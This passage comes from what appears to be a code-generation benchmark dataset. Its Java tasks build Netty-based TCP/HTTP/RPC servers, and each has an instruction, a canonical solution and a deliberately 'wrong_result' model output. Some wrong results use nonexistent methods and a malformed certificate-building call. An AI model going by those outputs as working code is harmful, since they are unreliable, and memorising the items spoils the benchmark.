    "Instruction": "Task Description: Create a Java class that implements a Netty-based HTTP server for handling RPC (Remote Procedure Call) requests. The server should manage incoming connections, process HTTP requests, and handle server lifecycle events (start/stop).\n\nClass Description: NettyHttpServer is a server implementation that uses Netty framework to create a non-blocking HTTP server capable of handling RPC requests. It manages thread pools for request processing and implements proper resource cleanup during shutdown.\n\nAttributes:\n- thread: Thread - The thread in which the Netty server runs\n- logger: Logger - Logger instance for server events (inherited from parent class)\n\nMethods:\n- start(XxlRpcProviderFactory) -> void - Starts the Netty HTTP server on a specified port, initializes thread pools, and sets up request handlers\n  - Input: xxlRpcProviderFactory - Configuration factory containing server parameters like port number and thread pool sizes\n  - Output: None (server runs asynchronously in a separate thread)\n  \n- stop() -> void - Stops the server gracefully by interrupting the server thread and shutting down all resources\n  - Input: None\n  - Output: None (performs cleanup operations)\n\nThe implementation should follow Netty best practices including:\n1. Using separate event loop groups for connection acceptance and request processing\n2. Proper channel pipeline configuration with HTTP codecs and aggregator\n3. Idle connection handling\n4. Graceful shutdown of all resources\n5. Thread pool management for request processing\n6. Proper error handling and logging",
    "Canonical_solution": "import com.wugui.datax.rpc.remoting.net.Server;\nimport com.wugui.datax.rpc.remoting.net.common.NettyConstant;\nimport com.wugui.datax.rpc.remoting.net.params.Beat;\nimport com.wugui.datax.rpc.remoting.provider.XxlRpcProviderFactory;\nimport com.wugui.datax.rpc.util.ThreadPoolUtil;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyHttpServer extends Server {\n\n    private Thread thread;\n\n    @Override\n    public void start(final XxlRpcProviderFactory xxlRpcProviderFactory) {\n        thread = new Thread(() -> {\n            final ThreadPoolExecutor serverHandlerPool = ThreadPoolUtil.makeServerThreadPool(\n                    NettyHttpServer.class.getSimpleName(),\n                    xxlRpcProviderFactory.getCorePoolSize(),\n                    xxlRpcProviderFactory.getMaxPoolSize());\n            EventLoopGroup bossGroup = new NioEventLoopGroup();\n            EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n            try {\n                ServerBootstrap bootstrap = new ServerBootstrap();\n                bootstrap.group(bossGroup, workerGroup)\n                        .channel(NioServerSocketChannel.class)\n                        .childHandler(new ChannelInitializer<SocketChannel>() {\n                            @Override\n                            public void initChannel(SocketChannel channel) {\n                                channel.pipeline()\n                                        .addLast(new IdleStateHandler(0, 0, Beat.BEAT_INTERVAL * 3, TimeUnit.SECONDS))\n                                        .addLast(new HttpServerCodec())\n                                        .addLast(new HttpObjectAggregator(NettyConstant.MAX_LENGTH))\n                                        .addLast(new NettyHttpServerHandler(xxlRpcProviderFactory, serverHandlerPool));\n                            }\n                        })\n                        .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n                ChannelFuture future = bootstrap.bind(xxlRpcProviderFactory.getPort()).sync();\n                logger.info(\">>>>>>>>>>> xxl-rpc remoting server start success, nettype = {}, port = {}\", NettyHttpServer.class.getName(), xxlRpcProviderFactory.getPort());\n                onStarted();\n\n                future.channel().closeFuture().sync();\n            } catch (InterruptedException e) {\n                if (e instanceof InterruptedException) {\n                    logger.info(\">>>>>>>>>>> xxl-rpc remoting server stop.\");\n                } else {\n                    logger.error(\">>>>>>>>>>> xxl-rpc remoting server error.\", e);\n                }\n            } finally {\n                try {\n                    serverHandlerPool.shutdown();\n                } catch (Exception e) {\n                    logger.error(e.getMessage(), e);\n                }\n                try {\n                    workerGroup.shutdownGracefully();\n                    bossGroup.shutdownGracefully();\n                } catch (Exception e) {\n                    logger.error(e.getMessage(), e);\n                }\n            }\n        });\n        thread.setDaemon(true);\n        thread.start();\n    }\n\n    @Override\n    public void stop() {\n        if (thread != null && thread.isAlive()) {\n            thread.interrupt();\n        }\n        onStopped();\n        logger.info(\">>>>>>>>>>> xxl-rpc remoting server destroy success.\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class NettyHttpServer {\n    private final Thread thread;\n    private final Logger logger;\n    private ServerBootstrap bootstrap;\n    private Channel channel;\n    private ExecutorService rpcThreadPool;\n\n    public NettyHttpServer(Logger logger) {\n        this.logger = logger;\n        this.thread = new Thread(this::run);\n    }\n\n    public void start(XxlRpcProviderFactory factory) {\n        int port = factory.getPort();\n        int bossThreads = factory.getBossThreads();\n        int workerThreads = factory.getWorkerThreads();\n        int rpcThreadPoolSize = factory.getRpcThreadPoolSize();\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(bossThreads);\n        EventLoopGroup workerGroup = new NioEventLoopGroup(workerThreads);\n\n        rpcThreadPool = Executors.newFixedThreadPool(rpcThreadPoolSize);\n\n        bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new IdleStateHandler(0, 0, 30, TimeUnit.SECONDS));\n                        pipeline.addLast(new HttpServerCodec());\n                        pipeline.addLast(new HttpObjectAggregator(65536));\n                        pipeline.addLast(new RpcRequestHandler(rpcThreadPool, factory));\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        try {\n            ChannelFuture future = bootstrap.bind(port).sync();\n            channel = future.channel();\n            thread.start();\n        } catch (Exception e) {\n            logger.error(\"Failed to start server\", e);\n            shutdown();\n        }\n    }\n\n    public void stop() {\n        if (thread != null) {\n            thread.interrupt();\n        }\n        if (channel != null) {\n            channel.close();\n        }\n        if (bootstrap != null) {\n            bootstrap.group().shutdownGracefully();\n        }\n        if (rpcThreadPool != null) {\n            rpcThreadPool.shutdownNow();\n        }\n    }\n\n    private void run() {\n        try {\n            if (channel != null) {\n                channel.closeFuture().sync();\n            }\n        } catch (InterruptedException e) {\n            logger.warn(\"Server thread interrupted\", e);\n        } finally {\n            shutdown();\n        }\n    }\n\n    private void shutdown() {\n        if (bootstrap != null) {\n            bootstrap.group().shutdownGracefully();\n        }\n        if (rpcThreadPool != null) {\n            rpcThreadPool.shutdownNow();\n        }\n    }\n}"
  },
  {
    "Task_id": 167,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and process requests.\n\nClass Description: DiscardServer is a Netty-based TCP server that listens on a specified port, accepts incoming connections, and processes client requests using a custom handler. The server uses non-blocking I/O and is designed to be gracefully shutdown when no longer needed.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\n\nMethods:\nDiscardServer: (int port) -> void - Constructor that initializes the server with the specified port number\nrun: () -> void - Starts the server, binds it to the configured port, and begins accepting connections. Throws Exception if any error occurs during startup\nmain: (String[] args) -> void - Entry point that creates and starts the server instance with either a specified port or default port 8080",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class DiscardServer {\n\n    private int port;\n\n    public DiscardServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new DiscardServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = args.length > 0 ? Integer.parseInt(args[0]) : 8080;\n        new DiscardServer(port).run();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class DiscardServer {\n    private final int port;\n\n    public DiscardServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ch.pipeline().addLast(new DiscardServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) {\n        int port = 8080;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n        DiscardServer server = new DiscardServer(port);\n        try {\n            server.run();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class DiscardServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            ReferenceCountUtil.release(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 170,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling HTTP requests with optional SSL encryption.\n\nClass Description: The HttpSnoopServer class is a Netty-based HTTP server that can operate in both secure (HTTPS) and non-secure (HTTP) modes. It uses a boss-worker thread model for handling connections and includes SSL support through self-signed certificates when enabled.\n\nAttributes:\n- SSL: static final boolean - Determines whether SSL encryption should be enabled (configured via system property \"ssl\")\n- PORT: static final int - The port number the server will listen on (configured via system property \"port\", defaults to 8443 for SSL or 8080 for non-SSL)\n\nMethods:\n- start(): void - Starts the HTTP server with the configured settings. Throws Exception if server startup fails.\n  - Initializes SSL context if enabled\n  - Sets up boss and worker event loop groups\n  - Configures server bootstrap with channel type and handlers\n  - Binds to specified port and starts accepting connections\n  - Handles graceful shutdown of resources",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class HttpSnoopServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8443\" : \"8080\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new HttpSnoopServerInitializer(sslCtx));\n\n            Channel ch = b.bind(PORT).sync().channel();\n\n            System.err.println(\"Open your web browser and navigate to \" +\n                    (SSL? \"https\" : \"http\") + \"://127.0.0.1:\" + PORT + '/');\n\n            ch.closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class HttpSnoopServer {\n    public static final boolean SSL = Boolean.getBoolean(\"ssl\");\n    public static final int PORT = Integer.getInteger(\"port\", SSL ? 8443 : 8080);\n\n    public void start() throws Exception {\n        SslContext sslContext = null;\n        if (SSL) {\n            Security.addProvider(new BouncyCastleProvider());\n            KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n            keyGen.initialize(2048);\n            KeyPair keyPair = keyGen.generateKeyPair();\n\n            X509v3CertificateBuilder certBuilder = new X509v3CertificateBuilder(\n                new X500Principal(\"CN=localhost\"),\n                BigInteger.valueOf(System.currentTimeMillis()),\n                Calendar.getInstance().getTime(),\n                Calendar.getInstance().getTime().getTime() + 365 * 24 * 60 * 60 * 1000,\n                new X509SubjectPublicKeyInfo(SubjectPublicKeyInfo.getInstance(keyPair.getPublic().getEncoded())),\n                new AlgorithmIdentifier(\"SHA256withRSA\", (short) 0)\n            );\n\n            ContentSigner signer = new JcaContentSignerBuilder(\"SHA256withRSA\")\n                .build(keyPair.getPrivate());\n\n            X509Certificate certificate = new JcaX509CertificateConverter()\n                .setProvider(\"BC\")\n                .build(certBuilder.build(signer));\n\n            KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\n            keyStore.load(null, null);\n            keyStore.setKeyEntry(\"server\", keyPair, \"password\".toCharArray(), new Certificate[]{certificate});\n\n            sslContext = SslContextBuilder.forServer(keyStore, \"password\")\n                .build();\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            b.childHandler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    if (SSL) {\n                        p.addLast(sslContext.newHandler(ch.alloc()));\n                    }\n                    p.addLast(new HttpServerCodec());\n                    p.addLast(new HttpObjectAggregator(65536));\n                    p.addLast(new SimpleChannelInboundHandler<FullHttpRequest>() {\n                        @Override\n                        protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest request) throws Exception {\n                            System.out.println(\"Received request: \" + request.method() + \" \" + request.uri());\n                        }\n                    });\n                }\n            });\n\n            ChannelFuture f = b.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) {\n        HttpSnoopServer server = new HttpSnoopServer();\n        try {\n            server.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}"
  },
  {
    "Task_id": 172,
    "Instruction": "Task Description: Implement a Netty-based TCP server class that handles RPC (Remote Procedure Call) requests and responses, including server startup, shutdown, and connection management.\n\nClass Description: NettyServer is a TCP server implementation using Netty framework that provides RPC functionality. It manages server lifecycle, connection handling, and request processing through a thread pool.\n\nAttributes:\n- thread: Thread - The thread running the Netty server instance\n\nMethods:\n- start(XxlRpcProviderFactory) -> void - Starts the Netty server with the specified RPC provider configuration. Initializes thread pools, event loops, and server bootstrap.\n  Input: \n    - xxlRpcProviderFactory: XxlRpcProviderFactory - Configuration factory providing server parameters and serializer\n  Output: None (server runs asynchronously in background thread)\n\n- stop() -> void - Stops the Netty server gracefully by interrupting the server thread and shutting down resources.\n  Input: None\n  Output: None (performs cleanup operations)\n\nThe class should handle:\n1. Server bootstrap configuration with NIO transport\n2. Connection pipeline setup with idle state detection\n3. Request/response serialization\n4. Thread pool management for request processing\n5. Graceful shutdown procedures",
    "Canonical_solution": "import com.wugui.datax.rpc.remoting.net.params.XxlRpcRequest;\nimport com.wugui.datax.rpc.remoting.net.params.XxlRpcResponse;\nimport com.wugui.datax.rpc.remoting.provider.XxlRpcProviderFactory;\nimport com.wugui.datax.rpc.util.ThreadPoolUtil;\nimport com.wugui.datax.rpc.remoting.net.Server;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.timeout.IdleStateHandler;\n\nimport java.util.concurrent.ThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyServer extends Server {\n\n    private Thread thread;\n\n    @Override\n    public void start(final XxlRpcProviderFactory xxlRpcProviderFactory) throws Exception {\n        thread = new Thread(new Runnable() {\n            @Override\n            public void run() {\n                final ThreadPoolExecutor serverHandlerPool = ThreadPoolUtil.makeServerThreadPool(\n                        NettyServer.class.getSimpleName(),\n                        xxlRpcProviderFactory.getCorePoolSize(),\n                        xxlRpcProviderFactory.getMaxPoolSize());\n                EventLoopGroup bossGroup = new NioEventLoopGroup();\n                EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n                try {\n                    ServerBootstrap bootstrap = new ServerBootstrap();\n                    bootstrap.group(bossGroup, workerGroup)\n                            .channel(NioServerSocketChannel.class)\n                            .childHandler(new ChannelInitializer<SocketChannel>() {\n                                @Override\n                                public void initChannel(SocketChannel channel) throws Exception {\n                                    channel.pipeline()\n                                            .addLast(new IdleStateHandler(0,0, Beat.BEAT_INTERVAL*3, TimeUnit.SECONDS))\n                                            .addLast(new NettyDecoder(XxlRpcRequest.class, xxlRpcProviderFactory.getSerializerInstance()))\n                                            .addLast(new NettyEncoder(XxlRpcResponse.class, xxlRpcProviderFactory.getSerializerInstance()))\n                                            .addLast(new NettyServerHandler(xxlRpcProviderFactory, serverHandlerPool));\n                                }\n                            })\n                            .childOption(ChannelOption.TCP_NODELAY, true)\n                            .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n                    ChannelFuture future = bootstrap.bind(xxlRpcProviderFactory.getPort()).sync();\n                    onStarted();\n                    future.channel().closeFuture().sync();\n                } catch (Exception e) {\n                    if (e instanceof InterruptedException) {\n                        logger.info(\">>>>>>>>>>> xxl-rpc remoting server stop.\");\n                    } else {\n                        logger.error(\">>>>>>>>>>> xxl-rpc remoting server error.\", e);\n                    }\n                } finally {\n                    try {\n                        serverHandlerPool.shutdown();\n                    } catch (Exception e) {\n                        logger.error(e.getMessage(), e);\n                    }\n                    try {\n                        workerGroup.shutdownGracefully();\n                        bossGroup.shutdownGracefully();\n                    } catch (Exception e) {\n                        logger.error(e.getMessage(), e);\n                    }\n                }\n            }\n        });\n        thread.setDaemon(true);\n        thread.start();\n    }\n\n    @Override\n    public void stop() throws Exception {\n        if (thread != null && thread.isAlive()) {\n            thread.interrupt();\n        }\n        onStopped();\n        logger.info(\">>>>>>>>>>> xxl-rpc remoting server destroy success.\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class NettyServer {\n    private Thread thread;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private XxlRpcProviderFactory xxlRpcProviderFactory;\n    private ServerBootstrap bootstrap;\n\n    public void start(XxlRpcProviderFactory xxlRpcProviderFactory) {\n        this.xxlRpcProviderFactory = xxlRpcProviderFactory;\n        int port = xxlRpcProviderFactory.getPort();\n        int threadPoolSize = xxlRpcProviderFactory.getThreadPoolSize();\n\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup(threadPoolSize);\n        bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        pipeline.addLast(new IdleStateHandler(0, 0, 5, TimeUnit.SECONDS));\n                        pipeline.addLast(new RpcEncoder(xxlRpcProviderFactory.getSerializer()));\n                        pipeline.addLast(new RpcDecoder(xxlRpcProviderFactory.getSerializer()));\n                        pipeline.addLast(new RpcHandler(xxlRpcProviderFactory));\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        thread = new Thread(() -> {\n            try {\n                ChannelFuture future = bootstrap.bind(port).sync();\n                future.channel().closeFuture().sync();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            } finally {\n                shutdown();\n            }\n        });\n        thread.start();\n    }\n\n    public void stop() {\n        if (thread != null) {\n            thread.interrupt();\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n        if (xxlRpcProviderFactory != null) {\n            xxlRpcProviderFactory.shutdownThreadPool();\n        }\n    }\n\n    private class RpcHandler extends ChannelInboundHandlerAdapter {\n        private final XxlRpcProviderFactory factory;\n\n        public RpcHandler(XxlRpcProviderFactory factory) {\n            this.factory = factory;\n        }\n\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            try {\n                RpcRequest request = (RpcRequest) msg;\n                Object response = factory.getServiceProvider().invoke(request);\n                ctx.writeAndFlush(factory.getSerializer().serialize(response));\n            } catch (Exception e) {\n                e.printStackTrace();\n                ctx.writeAndFlush(factory.getSerializer().serialize(new RpcResponse(e.getMessage())));\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 173,
    "Instruction": "Task Description: Implement a TCP server using Java Netty framework that echoes back any received messages to the client. The server should be configurable to run on any specified port and should properly handle resource cleanup during shutdown.\n\nClass Description: EchoServer is a Netty-based TCP server implementation that listens for incoming connections, processes received messages by echoing them back, and manages server lifecycle including startup and graceful shutdown.\n\nAttributes:\n- DEFAULT_PORT: int - The default port number (7) to use when no port is specified\n- bossGroup: EventLoopGroup - The parent event loop group that accepts incoming connections\n- workerGroup: EventLoopGroup - The child event loop group that handles the traffic of accepted connections\n- bootstrap: ServerBootstrap - The server bootstrap instance used to configure and start the server\n\nMethods:\n- EchoServer() -> None - Constructor that initializes the event loop groups and server bootstrap\n- start(int port) -> void - Starts the server on the specified port, configures channel options and handlers, and binds to the port\n  Input: port (int) - The port number to bind the server to\n- stop() -> void - Shuts down the event loop groups gracefully to release all resources\n- main(String[] args) -> void - Entry point that creates and starts the server instance\n  Input: args (String[]) - Command line arguments (optional port number)\n  Output: None (runs indefinitely until terminated)",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class EchoServer {\n\n    public static int DEFAULT_PORT = 7;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public EchoServer() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) throws InterruptedException {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new EchoServerChannelInitializer())\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"EchoServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            stop();\n        }\n    }\n\n    public void stop() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = args.length > 0 ? Integer.parseInt(args[0]) : DEFAULT_PORT;\n        EchoServer server = new EchoServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "wrong_result": "public class EchoServer {\n    public static final int DEFAULT_PORT = 7;\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public EchoServer() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class);\n    }\n\n    public void start(int port) {\n        bootstrap.childHandler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            public void initChannel(SocketChannel ch) {\n                ch.pipeline().addLast(\n                        new DelimiterBasedFrameDecoder(8192, Delimiters.lineDelimiter()),\n                        new StringDecoder(),\n                        new EchoServerHandler()\n                );\n            }\n        });\n\n        bootstrap.option(ChannelOption.SO_BACKLOG, 1024);\n        bootstrap.childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        try {\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) {\n        EchoServer server = new EchoServer();\n        int port = DEFAULT_PORT;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n        server.start(port);\n    }\n\n    private static class EchoServerHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            ctx.writeAndFlush(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 174,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle incoming client connections and manage communication protocols.\n\nClass Description: RemoteServer is a TCP server implementation using Netty framework that listens on a specified port, manages client connections, and maintains a list of communication protocols. It extends BaseServer for basic server functionality.\n\nAttributes:\n- port: int - The port number on which the server listens for incoming connections\n- protocolList: List<Protocol> - A list to maintain active communication protocols between clients and browsers\n\nMethods:\n- RemoteServer(int port) -> [Constructor] - Initializes the server with the specified port and creates an empty protocol list\n- listen(int port) -> void - Sets the server's listening port\n- start() -> void - Starts the Netty server, configures the server bootstrap with worker groups, channel type, and handlers, then binds to the specified port\n- findProtocolByBrowser(ChannelHandlerContext ctx) -> Protocol - Finds and returns a protocol associated with a browser's channel context\n- findProtocolByKey(String key) -> Protocol - Finds and returns a protocol associated with a specific key\n- findProtocolByClient(ChannelHandlerContext ctx) -> Protocol - Finds and returns a protocol associated with a client's channel context",
    "Canonical_solution": "import com.yeetor.androidcontrol.*;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.util.LinkedList;\nimport java.util.List;\n\npublic class RemoteServer extends BaseServer {\n    private int port = -1;\n    List<Protocol> protocolList;\n\n    public RemoteServer(int port) {\n        listen(port);\n        protocolList = new LinkedList<Protocol>();\n    }\n\n    public void listen(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .childHandler(new ChildChannel(new RemoteServerWebsocketEventImp()));\n\n        ChannelFuture future = bootstrap.bind(port).sync();\n        future.channel().closeFuture().sync();\n    }\n\n    private Protocol findProtocolByBrowser(ChannelHandlerContext ctx) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getBroswerSocket() != null && protocol.getBroswerSocket() == ctx) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n\n    private Protocol findProtocolByKey(String key) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getBroswerSocket() != null && StringUtils.equals(key, protocol.getKey())) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n\n    private Protocol findProtocolByClient(ChannelHandlerContext ctx) {\n        for (Protocol protocol : protocolList) {\n            if (protocol.getClientSocket() != null && protocol.getClientSocket() == ctx) {\n                return protocol;\n            }\n        }\n        return null;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
